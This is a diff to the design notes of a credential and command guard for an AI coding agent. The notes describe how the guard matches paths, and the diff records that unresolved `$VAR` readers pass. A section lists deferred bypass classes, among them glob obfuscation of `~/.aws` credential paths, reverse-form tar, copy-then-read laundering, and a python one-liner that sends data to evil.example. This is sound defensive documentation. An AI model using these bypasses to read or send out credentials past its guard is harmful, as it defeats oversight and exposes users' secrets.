@@ -196,9 +196,8 @@ walks tokens after the CLI binary and classifies each `--flag`:
    `--output`, `--query`, `--max-results`, paging tokens).
 3. **Unknown** — long `--*` flags on neither list. Logged to the
    JSONL audit record under `unknown_flags: [...]` (flag name only,
-   never the value; capped at 8). In strict mode (`permission_mode`
-   is `auto`, `dontAsk`, or `bypassPermissions` — any unattended
-   mode), presence of any unknown flag escalates an otherwise-allow
+   never the value; capped at 8). In lockdown (`guard mode
+   lockdown`), presence of any unknown flag escalates an otherwise-allow
    to DENY via `bash.admin_unknown_flag_strict`.
 
 ### Forbidden subcommands
@@ -277,8 +276,8 @@ The credential, agent-output, subagent-scope, and protected-files validators
 operate on **path-as-signal**: every path-like token in any tool input is
 extracted and matched against a pattern set (filenames, extensions, and
 known sensitive directories). This catches direct reads, copy-source shadows
-(`cp`/`mv`/`dd`/`install`/`rsync`/`scp`/`tar c`), variable indirection in
-reader heads, and symlinks via `realpath`. The following bypass classes are
+(`cp`/`mv`/`dd`/`install`/`rsync`/`scp`/`tar c`), and symlinks via
+`realpath`. A reader whose argument is an unresolved `$VAR` passes. The following bypass classes are
 known and explicitly deferred:
 
 - **Glob obfuscation.** `cat ~/.a*/cre*` resolves to a credential file at
@@ -296,9 +295,9 @@ known and explicitly deferred:
   hides the credential path behind an fd. Bind-mounts have the same shape.
 - **Archive reverse-form.** `tar c -C ~/.aws .` may not surface the
   credential path as a token in the argv.
-- **Laundering after approved copy.** Once the user approves
+- **Laundering after an allowed copy.** Once the user allowlists or runs
   `cp creds /tmp/x`, subsequent reads of `/tmp/x` are unguarded. The
-  destination is not a credential path. This is inherent to ASK semantics,
+  destination is not a credential path. This is inherent to path matching,
   not a fixable matcher gap.
 - **Out-of-band exfil from a malicious runtime.** `python3 -c 'import
   urllib.request, pathlib; urllib.request.urlopen("https://evil.example",
@@ -311,8 +310,8 @@ known and explicitly deferred:
 - Honest mistakes (the dominant case in practice).
 - Surfacing prompt-injection attempts that ask the agent to read, copy, or
   write credential-shaped or destructive paths.
-- Forcing user approval across a wide universe of credential-shaped paths,
-  reader tools, and copy verbs — not just `cat ~/.aws/credentials`.
+- Denying access across a wide universe of credential-shaped paths, reader
+  tools, and copy verbs, not just `cat ~/.aws/credentials`.
 - Blocking AI-attribution in commit messages and similar embarrassment
   leaks the agent would otherwise emit silently.
 
